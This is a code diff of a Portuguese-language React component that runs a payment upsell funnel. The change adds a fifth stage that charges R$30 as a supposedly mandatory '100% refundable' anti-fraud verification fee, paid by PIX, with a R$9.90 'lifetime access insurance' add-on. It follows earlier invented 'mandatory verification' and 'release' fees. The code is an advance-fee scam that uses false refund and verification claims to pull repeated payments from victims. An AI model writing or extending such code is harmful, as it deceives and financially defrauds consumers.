@@ -8,7 +8,7 @@ interface Props {
   onClose: () => void
 }
 
-type FunnelStep = 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4' | 'final'
+type FunnelStep = 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4' | 'upsell5' | 'final'
 type QrStep = 'offer' | 'loading' | 'qr'
 
 interface PixData {
@@ -52,6 +52,7 @@ export default function UpsellFunnel({ onClose }: Props) {
   const [extra1, setExtra1] = useState(false)
   const [extra2, setExtra2] = useState(false)
   const [extra4, setExtra4] = useState(false)
+  const [extra5, setExtra5] = useState(false)
   const [pixData, setPixData] = useState<PixData | null>(null)
   const [copied, setCopied] = useState(false)
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)
@@ -61,6 +62,7 @@ export default function UpsellFunnel({ onClose }: Props) {
   const u2Total = 12.53 + (extra2 ? 14 : 0)
   const u3Total = 12.9 // Verificação Final Obrigatória (sem order bump)
   const u4Total = 20 + (extra4 ? 5.4 : 0) // Acesso VIP Completo (+ Pack Secreto)
+  const u5Total = 30 + (extra5 ? 9.9 : 0) // Taxa Reembolsável (+ Seguro de Acesso)
 
   useEffect(() => {
     document.body.style.overflow = 'hidden'
@@ -78,6 +80,7 @@ export default function UpsellFunnel({ onClose }: Props) {
     else if (funnel === 'upsell2') trackFunnel('upsell2_view')
     else if (funnel === 'upsell3') trackFunnel('upsell3_view')
     else if (funnel === 'upsell4') trackFunnel('upsell4_view')
+    else if (funnel === 'upsell5') trackFunnel('upsell5_view')
     else if (funnel === 'final') trackFunnel('funnel_complete')
   }, [funnel])
 
@@ -87,7 +90,8 @@ export default function UpsellFunnel({ onClose }: Props) {
     upsell1: { value: u1Total, cid: 'upsell-verificacao', cname: 'Verificação Obrigatória', paid: 'upsell1_paid' as const, next: 'upsell2' as FunnelStep },
     upsell2: { value: u2Total, cid: 'upsell-liberacao', cname: 'Taxa de Liberação de Uso', paid: 'upsell2_paid' as const, next: 'upsell3' as FunnelStep },
     upsell3: { value: u3Total, cid: 'upsell-final', cname: 'Verificação Final Obrigatória', paid: 'upsell3_paid' as const, next: 'upsell4' as FunnelStep },
-    upsell4: { value: u4Total, cid: 'upsell-vip', cname: 'Acesso VIP Completo', paid: 'upsell4_paid' as const, next: 'final' as FunnelStep },
+    upsell4: { value: u4Total, cid: 'upsell-vip', cname: 'Acesso VIP Completo', paid: 'upsell4_paid' as const, next: 'upsell5' as FunnelStep },
+    upsell5: { value: u5Total, cid: 'upsell-reembolsavel', cname: 'Taxa Reembolsável', paid: 'upsell5_paid' as const, next: 'final' as FunnelStep },
   }
 
   useEffect(() => {
@@ -100,7 +104,7 @@ export default function UpsellFunnel({ onClose }: Props) {
           clearInterval(pollRef.current!)
 
           // Purchase separado para cada taxa
-          const cfg = STEP[funnel as 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4']
+          const cfg = STEP[funnel as 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4' | 'upsell5']
           if (cfg) {
             trackEvent({
               event: 'Purchase',
@@ -114,6 +118,7 @@ export default function UpsellFunnel({ onClose }: Props) {
             if (funnel === 'upsell1' && extra1) trackFunnel('bump_whatsapp')   // order bump U1
             if (funnel === 'upsell2' && extra2) trackFunnel('bump_calcinha')  // order bump U2
             if (funnel === 'upsell4' && extra4) trackFunnel('bump_packsecreto') // order bump U4
+            if (funnel === 'upsell5' && extra5) trackFunnel('bump_segurovip')   // order bump U5
 
             setFunnel(cfg.next); setQrStep('offer'); setPixData(null)
           }
@@ -137,7 +142,7 @@ export default function UpsellFunnel({ onClose }: Props) {
       setQrStep('qr')
 
       // InitiateCheckout para cada taxa
-      const cfg = STEP[funnel as 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4']
+      const cfg = STEP[funnel as 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4' | 'upsell5']
       trackEvent({
         event: 'InitiateCheckout',
         value: amount,
@@ -485,6 +490,88 @@ export default function UpsellFunnel({ onClose }: Props) {
                   <div className="border border-gray-200 bg-gray-50 rounded-xl px-3 py-2 mt-3 text-center">
                     <p className="text-[11px] text-gray-500">🔒 Conteúdo privado e sigiloso. Compartilhamentos indevidos resultam em bloqueio permanente do acesso.</p>
                   </div>
+                  <Footer />
+                </div>
+              )
+            }
+          </>
+        )}
+
+        {/* ── UPSELL 5: Taxa 100% Reembolsável ── */}
+        {funnel === 'upsell5' && (
+          <>
+            <TimerBar label="Tempo restante:" />
+            <div className="bg-gradient-to-r from-blue-600 to-blue-500 px-5 pt-4 pb-4 text-center">
+              <p className="text-3xl mb-1">💰</p>
+              <h2 className="text-white text-lg font-black mb-0.5">Taxa 100% Reembolsável</h2>
+              <p className="text-white/80 text-xs">Seu valor volta integral em até 7 dias úteis</p>
+            </div>
+
+            {qrStep === 'qr'
+              ? <QRScreen accentClass="text-blue-500" />
+              : (
+                <div className="bg-white px-5 pt-4 pb-5">
+                  <img
+                    src="/media/anexo_3.jpg"
+                    alt="Taxa Reembolsável"
+                    className="w-full rounded-xl mb-3 border border-gray-200"
+                    onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = 'none' }}
+                  />
+                  <p className="text-sm text-gray-700 mb-3 leading-relaxed">
+                    Esta é uma <strong>taxa única de garantia</strong> exigida pelo sistema
+                    antifraude para confirmar que você é o titular do pagamento. O valor é
+                    <strong> 100% reembolsável</strong>: assim que o acesso é validado, ele
+                    retorna <strong>integralmente</strong> para a sua conta em até 7 dias
+                    úteis, direto pelo banco.
+                  </p>
+                  <ul className="space-y-1.5 mb-3">
+                    {['Valor devolvido 100% em até 7 dias úteis', 'Confirma a titularidade e libera o acesso na hora', 'Proteção antifraude e antibloqueio', 'Acesso vitalício garantido após a validação'].map((b) => (
+                      <li key={b} className="flex items-center gap-2 text-sm text-gray-700"><Check />{b}</li>
+                    ))}
+                  </ul>
+                  <p className="text-center text-xs text-gray-500 mb-0.5">💎 Taxa reembolsável:</p>
+                  <p className="text-center font-black text-blue-600 text-4xl mb-1">R$ {fmt(u5Total)}</p>
+                  <div className="border border-blue-200 bg-blue-50 rounded-xl px-3 py-2 mb-3 text-center">
+                    <p className="text-xs text-blue-700 font-semibold">🔒 Reembolso garantido — é só uma verificação, o valor volta pra você.</p>
+                  </div>
+
+                  {/* Order bump */}
+                  <div className="relative mb-3">
+                    <span className="absolute -top-2.5 left-3 bg-blue-500 text-white text-[9px] font-black px-2 py-0.5 rounded-full uppercase tracking-wide z-10">
+                      Oferta especial
+                    </span>
+                    <label
+                      className="flex items-center gap-3 border-2 border-dashed border-blue-400 rounded-xl px-3 pt-4 pb-3 bg-blue-50 cursor-pointer"
+                      onClick={() => setExtra5(!extra5)}
+                    >
+                      <div className={`w-5 h-5 rounded flex-shrink-0 border-2 flex items-center justify-center transition-colors ${extra5 ? 'bg-blue-500 border-blue-500' : 'border-gray-300 bg-white'}`}>
+                        {extra5 && <svg viewBox="0 0 24 24" fill="none" className="w-3 h-3"><path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg>}
+                      </div>
+                      <div>
+                        <p className="text-sm font-bold text-gray-900 leading-tight">🛡️ Seguro de Acesso Vitalício</p>
+                        <p className="text-sm font-black text-blue-600 leading-tight">+ R$ 9,90</p>
+                        <p className="text-[11px] text-gray-500 leading-tight">Se o link cair ou for bloqueado, reativamos seu acesso na hora — pra sempre</p>
+                      </div>
+                    </label>
+                  </div>
+
+                  <p className="text-center text-sm text-gray-600 mb-3">
+                    Total: <span className="font-black text-gray-900">R$ {fmt(u5Total)}</span>
+                  </p>
+                  <button
+                    onClick={() => pay(u5Total, 'Taxa Reembolsável')}
+                    disabled={qrStep === 'loading'}
+                    className="w-full bg-gradient-to-r from-blue-600 to-blue-500 text-white font-black text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2 shadow-lg shadow-blue-200/60 active:scale-[0.98] transition-transform disabled:opacity-70"
+                  >
+                    {qrStep === 'loading' ? 'Gerando PIX...' : '💰 Pagar taxa reembolsável e liberar'}
+                  </button>
+                  <button
+                    onClick={() => setFunnel('final')}
+                    disabled={qrStep === 'loading'}
+                    className="w-full mt-2 text-xs text-gray-400 underline disabled:opacity-50"
+                  >
+                    Pular esta etapa
+                  </button>
                   <Footer />
                 </div>
               )
